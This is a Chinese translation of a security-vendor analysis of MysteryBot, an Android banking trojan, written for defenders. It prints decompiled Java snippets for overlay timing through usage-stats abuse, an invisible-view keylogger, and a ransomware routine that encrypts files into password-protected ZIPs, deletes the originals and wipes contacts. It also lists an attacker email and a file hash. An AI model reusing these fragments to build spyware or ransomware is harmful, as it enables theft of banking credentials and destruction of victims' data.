# 新型安卓银行木马 MysteryBot 详细分析

阅读量 **149009**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-19 14:02:46

 **x**

##### 译文声明

本文是翻译文章，文章来源：www.threatfabric.com

原文地址：<https://www.threatfabric.com/blogs/mysterybot__a_new_android_banking_trojan_ready_for_android_7_and_8.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01234624acac3ea5b5.png)

## 前言

在处理我们的日常可疑样本时，我们对Android银行木马LokiBot的检测规则与LokiBot本身似乎完全不同的样本相匹配，这促使我们更仔细地研究它。看一下bot命令，我们首先认为LokiBot已经改进了。然而，我们很快意识到还有更多的事情正在发生：bot的名字和操作面板的名称都变成了“MysteryBot”，甚至网络通信也发生了变化。

在对其网络活动的调查中，我们发现MysteryBot和LokiBot
Android银行木马都在同一个C&C服务器上运行。这很快使我们得出了一个初步结论，即这个新发现的恶意软件要么是对Lokibot的更新，要么是由同一参与者开发的另一个银行木马程序。

为了验证我们的想法，我们搜索了一些其他来源，并发现使用相同C&C的两个恶意软件样本之间有更多的相似之处，如下Koodous的截图所示：

[](https://p1.ssl.qhimg.com/t017080dadf68c1a29d.png
"与Koodous上的LokiBot链接的MysteryBot")

## 功能

这个bot具有最普通的Android银行木马功能，但似乎超过平均水平。覆盖、关键日志和勒索的功能是新颖的，在后面我们会详细介绍。下表列出了所有的bot命令和相关特性。

[](https://p1.ssl.qhimg.com/t017625f6d2ac454fa5.png)

下面的屏幕截图显示了允许操作员在bot上启动特定命令的下拉列表：

[](https://p0.ssl.qhimg.com/t0155358018a9bb4149.png "命令启动程序的屏幕截图")

## 覆盖模块已支持Android 7/8

随着Android
7和8版本的引入，以前使用的覆盖技术变得无法访问，迫使出于经济动机的攻击者在他们的银行木马中寻找使用覆盖的新方法。在过去三个月中，一些最大的Android银行木马家族，如ExoBot
2.5、Anubis II、DiseaseBot，一直在探索新技术，以正确地对Android 7和8进行覆盖攻击。

覆盖攻击的成功取决于时间，在受害者打开相关应用程序时，诱使受害者在一个伪造的页面上询问凭证或信用卡信息。不定时覆盖会使覆盖屏幕出现在意外的时刻，导致受害者意识到恶意软件的存在。在Android
7和8中，Security-Enhanced
Linux(SELinux)和其他安全控制(沙箱限制)使用的限制使这一点变得困难。因此攻击者一直在努力寻找正确的时间重叠的新方法，这在Android银行木马犯罪生态系统中引发了许多技术争论。

它滥用了
[PACKAGE_USAGE_STATS](https://developer.android.com/reference/android/app/usage/UsageStatsManager)权限(通常称为Usage
Access权限)。MysteryBot的代码已经与所谓的Package_Usage_STATS技术进行了整合。因为滥用此Android权限需要受害者提供使用权限，所以MysteryBot使用流行的AccessibilityService，允许木马在未经受害者同意的情况下启用和滥用任何必需的权限。

经验告诉我们，用户通常授予应用程序[Device
Administrator](https://developer.android.com/guide/topics/admin/device-admin)和[AccessibilityService](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService)权限，授权恶意软件在受感染的设备上执行进一步的操作。如今，受害者授予这种权限的原因以及要求详尽权限集的应用程序的数量似乎使用户在不审查所请求的权限的情况下授予权限变得很常见。目前，MysteryBot没有使用这样的MO来获得使用访问权限，但会直接询问受害者或它。

下面的屏幕截图显示了恶意软件(隐藏为假AdobeFlashPlayer应用程序)一旦安装，列出了请求使用访问权限的应用程序。一旦触发受害者提供权限，恶意应用程序的状态将更改为“on”。

[](https://p0.ssl.qhimg.com/t01814583c8edc10c07.png "请求访问权限的应用程序的截图")

在对这一新技术进行调查时，我们重新创建了参与者用来检测前台应用程序的逻辑，以确认滥用该权限将允许覆盖工作。测试结果是肯定的，我们确实可以在前台得到应用程序的包名。下面的屏幕截图显示，在我们的测试设备上，包名为au.com.nab.Mobile(NAB移动银行)的应用程序位于前台，在Android
7和Android 8上都能工作。

[](https://p4.ssl.qhimg.com/t01dc3e22a9809e14fd.png)

这是BOT用来获取最新应用程序包名的代码片段：getLastUseApplication()

    
    
    @TargetApi(value = 21) 
    public void getLastUsedApplication() { 
        try { 
            do { 
                label_0: 
                TimeUnit.MILLISECONDS.sleep(1000); 
                gotolabel_8; 
            } while (true); 
        } catch (InterruptedException interruptedException) { 
            try { 
                interruptedException.printStackTrace(); 
                label_8: 
                Object usageStatsManager = this.getSystemService("usagestats"); 
                long epochTime = System.currentTimeMillis(); 
                List usageStatsList = ((UsageStatsManager) usageStatsManager).queryUsageStats(0, epochTime - 10000, epochTime); 
                if (usageStatsList == null || usageStatsList.size() <= 0) { 
                    gotolabel_0; 
                }
                TreeMap sortedMap = new TreeMap(); 
                Iterator usageStatsListIterator = usageStatsList.iterator(); 
                while (usageStatsListIterator.hasNext()) { 
                    Object usageStats = usageStatsListIterator.next(); 
                    ((SortedMap) sortedMap).put(Long.valueOf(((UsageStats) usageStats).getLastTimeUsed()), usageStats); 
                }
    
                if (((SortedMap) sortedMap).isEmpty()) { 
                    gotolabel_0; 
                }
    
                String packageName = ((SortedMap) sortedMap).get(((SortedMap) sortedMap).lastKey()).getPackageName(); 
                PrintStream printStream = System.out; 
                StringBuilder output = new StringBuilder().insert(0, "Total:================ ")); 
                output.append(packageName); 
                printStream.println(output.toString()); 
                gotolabel_0; 
            } catch (Exception ex) { 
                ex.printStackTrace(); 
                return; 
            } 
        }
    
    }
    

## 基于触摸数据的键记录(新)

在分析键盘记录程序的功能时，我们感到奇怪的是，没有使用任何已知的键盘记录技术。另外两个著名的Android银行木马嵌入键盘记录模块(CryEye和Anubis)确实滥用Android辅助功能来记录按键或在按键上进行截图；然而，这种技术要求受害者在安装恶意软件后授予辅助功能许可(因此需要更多的用户交互才能成功)。

MysteryBot似乎使用了一种新的创新技术来记录击键。它认为，键盘的每个键在屏幕上、在任何给定的电话上都有一个固定的位置，无论电话是水平还是垂直持有，它也考虑到每个键的大小相同，因此与前一个键的像素数相同。总之，该技术似乎计算了每一行的位置，并在每个键上放置一个视图。此视图的宽度和高度为0像素，由于使用了“FLAG_SECURE”设置，在屏幕截图中视图不可见。然后，每个视图与一个特定的键配对，这样它就可以记录已经按下的键，然后保存这些键以供进一步使用。

在编写本报告时，键盘记录器的代码似乎仍在开发中，因为还没有将日志发送到C2服务器的方法。

此代码片段显示用于记录击键的函数。请注意，设置了每个层的y坐标，而每个层的x坐标乘以当前迭代的值(因为整行键的布局仅在x轴上不同)。

    
    
    for (i = 0; true; ++i) { 
        int10 = 10; 
        int0x800053 = 0x800053; 
        if (i >= this.keyboardLayer0.length) { 
            break; 
        }
    
        this.keyboardLayer0[i] = View.inflate(((Context) this), resource, viewGroup); 
        windowManager = new WindowManager$LayoutParams(this.x / 10, 50, 2003, 0x40018, -3); 
        this.keyboardLayer0[i].setOnTouchListener(new HandleKeystrokeLayer0(this)); 
        windowManager.gravity = int0x800053; 
        windowManager.x = this.x / int10 * i; 
        windowManager.y = 0xFA; 
        this.systemServiceWindow.addView(this.keyboardLayer0[i], ((ViewGroup$LayoutParams) windowManager)); 
    }
    
    for (i = 0; i < this.keyboardLayer1.length; ++i) { 
        this.keyboardLayer1[i] = View.inflate(((Context) this), resource, viewGroup); 
        windowManager = new WindowManager$LayoutParams(this.x / 9, 50, 2003, 0x40018, -3); 
        this.keyboardLayer1[i].setOnTouchListener(new HandleKeystrokeLayer1(this)); 
        windowManager.gravity = int0x800053; 
        windowManager.x = this.x / 9 * i; 
        windowManager.y = 170; 
        this.systemServiceWindow.addView(this.keyboardLayer1[i], ((ViewGroup$LayoutParams) windowManager)); 
    }
    
    for (i = 0; i < this.keyboardLayer2.length; ++i) { 
        this.keyboardLayer2[i] = View.inflate(((Context) this), resource, viewGroup); 
        windowManager = new WindowManager$LayoutParams(this.x / 9, 50, 2003, 0x40018, -3); 
        this.keyboardLayer2[i].setOnTouchListener(new HandleKeystrokeLayer2(this)); 
        windowManager.gravity = int0x800053; 
        windowManager.x = this.x / 9 * i; 
        windowManager.y = 90; 
        this.systemServiceWindow.addView(this.keyboardLayer2[i], ((ViewGroup$LayoutParams) windowManager)); 
    }
    
    while (j < this.keyboardLayer3.length) { 
        this.keyboardLayer3[j] = View.inflate(((Context) this), resource, viewGroup); 
        i = 2; 
        int v4_1 = j == i ? this.x / 9 * 5 : this.x / 9; 
        int v8 = v4_1; 
        windowManager = new WindowManager$LayoutParams(v8, 50, 2003, 0x40018, -3); 
        this.keyboardLayer3[j].setOnTouchListener(new HandleKeystrokeLayer3(this)); 
        windowManager.gravity = int0x800053; 
        i = j > i ? this.x / 9 * (j + 4) : this.x / 9 * j; 
        windowManager.x = i; 
        windowManager.y = int10; 
        this.systemServiceWindow.addView(this.keyboardLayer3[j], ((ViewGroup$LayoutParams) windowManager)); 
        ++j;
    
    }
    

此代码片段显示用于保存击键的函数，该函数驻留在“HandleKeystrokeLayerN”类中。请注意，如果该值等于“4”，则会导致“[ACTION_OUTSIDE](https://developer.android.com/reference/android/view/MotionEvent.html#ACTION_OUTSIDE)”，只有当用户触摸UI元素(视图)之外屏幕上的某个位置时，才会激活该值。由于视图是0乘0像素，这应该始终是正确的，但如果这在某种程度上不同，击键不被记录。

    
    
    public boolean onTouch(View view, MotionEvent motionEvent) { 
        view.performClick(); 
        if(motionEvent.getAction() == 4) { 
            Keylogger.setKeyStroke(this.keylogger, Keylogger.getMotionEventFlagTotal(this.keylogger) + motionEvent.getFlags()); 
        } 
        return 0;
    }
    

此代码片段显示是否使用Shift或ALT键，存储为布尔值，如下面的方法所示。由于它使用自身的XOR值，因此true值被设置为false，反之亦然。

    
    
    if(character.equals("alt") { 
        Keylogger.setAltEnabled(this.keylogger, Keylogger.getIsAltEnabled(this.keylogger) ^ 1); 
    }
    
    if(character.equals("shift") { 
        Keylogger.getShiftEnabled(this.keylogger, Keylogger.setShift(this.keylogger) ^ 1); 
    }
    

此代码片段显示如何保存记录的击键(使用简单的检查)。

    
    
    if (!character.equals("outside") && !character.equals("symbols") && !character.equals("alt") && !character.equals("misc") && !character.equals("shift") && !character.equals("back") && !character.equals("enter")  { 
        keylogger = this.keylogger; 
        currentStroke = new StringBuilder().insert(0, Keylogger.getCurrentStroke(this.keylogger)); 
        currentStroke.append(character); 
        Keylogger.setCurrentStroke(keylogger, currentStroke.toString());
    }
    

## 勒索软件

一个名为“Myster_L0cker”的操作界面，如下截图所示：

[](https://p1.ssl.qhimg.com/t01d2922f51a9acd129.png "用于管理勒索受害者的界面的截图")

MysteryBot还嵌入了一个ransomware特性，允许自己单独加密外部存储目录中的所有文件，包括每个子目录，然后删除原始文件。加密过程将每个文件放入一个单独的ZIP存档中，该存档受密码保护，所有ZIP存档的密码都是相同的，并且是在运行时生成的。加密过程完成后，用户会收到一个对话框，指责受害者观看色情材料。要检索密码并能够解密文件，用户需要通过电子邮件将参与者的电子邮件发送到他的电子邮件地址：

    
    
    googleprotect[at]mail.ru
    

在分析Ransomware功能的过程中，出现了两个失败的地方：

首先，加密过程中使用的密码只有8个字符长，由拉丁字母的所有字符(大小写)和数字组成。要从其中挑选的字符总数为62个，使可能组合的总数达到62到8的幂，这可能过于粗暴的，并带有相关的处理能力。

其次，分配给每个受害者的ID可以是0到9999之间的数字。由于没有对现有ID进行验证，因此C2数据库中可能存在具有相同ID的另一个受害者，从而覆盖C2数据库中的ID。导致具有重复ID的老年受害者无法恢复他们的文件。

这个代码片段显示了用于生成加密过程中使用的密码的过程：GeneratePassword()

    
    
    public static String generatePassword() { 
        Random random = new Random(); 
        StringBuilder passwordLength8 = new StringBuilder(); 
        String seed = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
        for (int i = 0; i < 8; i++) { 
            int characterLocation = random.nextInt(seed.length()); 
            char currentChar = seed.charAt(characterLocation); 
            passwordLength8.append(currentChar); 
        } 
        return passwordLength8.toString();
    
    }
    

这个代码片段显示了递归扫描目录的代码：ScanDirectory()

    
    
    public void scanDirectory(File file) { 
        try { 
            File[] fileArray = file.listFiles(); 
            if (fileArray == null) { 
                return; 
            } 
            int amountOfFiles = fileArray.length; 
            for (int i = 0; i < amountOfFiles; i++) { 
                File currentFile = fileArray[i]; 
                if (currentFile.isDirectory()) { 
                    this.scanDirectory(currentFile); 
                } else { 
                    this.deleteFileEncryptInZip(currentFile); 
                } 
            } 
        } catch (Exception ex) { 
            ex.printStackTrace(); 
        }
    
    }
    

这个代码片段显示了用于加密给定目录的代码：delteFileEncryptInZip()

    
    
    public String deleteFileEncryptInZip(File file) { 
        try { 
            StringBuilder canonicalPath = new StringBuilder().insert(0, file.getCanonicalPath()); 
            canonicalPath.append(".zip"); 
            ZipFile zipFile = new ZipFile(canonicalPath.toString()); 
            ArrayList paths = new ArrayList(); 
            paths.add(new File(String.valueOf(file))); 
            ZipParameters zipParameters = new ZipParameters(); 
            zipParameters.setCompressionMethod(8); 
            zipParameters.setCompressionLevel(5); 
            zipParameters.setEncryptFiles(true); 
            zipParameters.setEncryptionMethod(99); 
            zipParameters.setAesKeyStrength(3); 
            zipParameters.setPassword(this.password); 
            zipFile.addFiles(paths, zipParameters); 
            file.delete(); 
            StringBuilder dblocksPath = new StringBuilder(); 
            dblocksPath.append(Environment.getExternalStorageDirectory()); 
            dblocksPath.append("/dblocks.txt"); 
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(dblocksPath.toString()), true)); 
            bufferedWriter.write("+1n"); 
            bufferedWriter.close(); 
        } catch (Exception ex) { 
            ex.printStackTrace(); 
        } 
        return ""; 
    }
    

这个代码片段显示了所有联系人的删除：delteContact()

    
    
    private void deleteContacts() { 
        ContentResolver contentResolver = this.getContentResolver(); 
        Cursor contacts = contentResolver.query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null); 
        while(contacts.moveToNext()) { 
            try { 
                contentResolver.delete(Uri.withAppendedPath(ContactsContract$Contacts.CONTENT_LOOKUP_URI, contacts.getString(contacts.getColumnIndex(LL.LLdecrypt("u0007Mu0004Iu001ER")))), null, null);  // lookup 
            } 
            catch(Exception ex) { 
                System.out.println(ex.getStackTrace()); 
            } 
        } 
        new ScanAndEncryptAsync(this).execute(new Integer[]{Integer.valueOf(1)});
    
    }
    

## 覆盖目标

get_inj_list 操作从C&C服务器检索带有覆盖的目标应用程序，注意在编写本文时，参与者正在扩展和进一步开发这个覆盖操作类。

以下是实际目标应用程序的列表(撰写本文时仍在开发中)：

[](https://p1.ssl.qhimg.com/t01ccee49a2b76d2b6e.jpg)

## 结论

尽管某些Android银行恶意木马家族如ExoBot 2.5、Anubis II、DiseaseBot等一直在探索对Android
7和8进行覆盖攻击的新技术，但MysteryBot背后的开发者似乎已经成功地实现了一种解决方案，并在创新上花了一些时间。覆盖攻击的实现滥用了使用访问权限，以便在Android操作系统的所有版本(包括最新的Android
7和8)上运行。

MysteryBot开发者使用这个新实现对密钥记录进行了创新。有效降低检测率并限制启用记录器所需的用户交互。实际上，关键日志记录机制基于屏幕上的接触点，而不是使用经常被滥用的Android可访问性服务，这意味着它比通常的击键更有可能记录更多的日志。该勒索软件还包括一个新的高度恼人的功能——删除接触名单中的受感染设备，这是银行木马到目前为止没有观察到的东西。其次，尽管仍在开发中的另一个功能引起了我们的注意，根据使用中的命名约定，名为GetMail的功能似乎是为了从受感染的设备收集电子邮件消息。增强的覆盖攻击还运行在最新的Android版本上，结合了先进的键盘记录和潜在的开发功能，将允许MysteryBot获取广泛的个人可识别信息，以执行欺诈。

在过去的6个月中，我们观察到代理、键盘记录、远程访问、录音和文件上传等功能越来越普遍；我们怀疑这种趋势只会在将来增长。这些功能的问题在于，除了绕过安全和检测措施之外，这些功能使威胁更少地针对目标，而更具有机会主义。例如，键盘记录、远程访问、文件上传和录音允许在没有特定触发器的情况下获取高级信息(即使受害者不进行网上银行业务，信息也可能被窃取和记录)。如果我们对此类行为增加的预期成为事实，这意味着金融机构将很难评估它们是否成为特定威胁的目标，所有受感染的设备都可能成为欺诈和间谍活动的来源。

## IOC

请注意，在撰写本文时，MysteryBot仍处于开发阶段，尚未广泛传播。

AdobeFlashPlayer(install.app)  
334f1efd0b347d54a418d1724d51f8451b7d0bebbd05f648383d05c00726a7ae

本文翻译自www.threatfabric.com
[原文链接](https://www.threatfabric.com/blogs/mysterybot__a_new_android_banking_trojan_ready_for_android_7_and_8.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **秋真平** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148201](/post/id/148201)

安全客 - 有思想的安全新媒体

本文转载自:
[www.threatfabric.com](https://www.threatfabric.com/blogs/mysterybot__a_new_android_banking_trojan_ready_for_android_7_and_8.html)

如若转载,请注明出处：
<https://www.threatfabric.com/blogs/mysterybot__a_new_android_banking_trojan_ready_for_android_7_and_8.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [技术分析](/tag/技术分析)
  * [银行木马](/tag/银行木马)
  * [MysteryBot](/tag/MysteryBot)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg) 秋真平

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

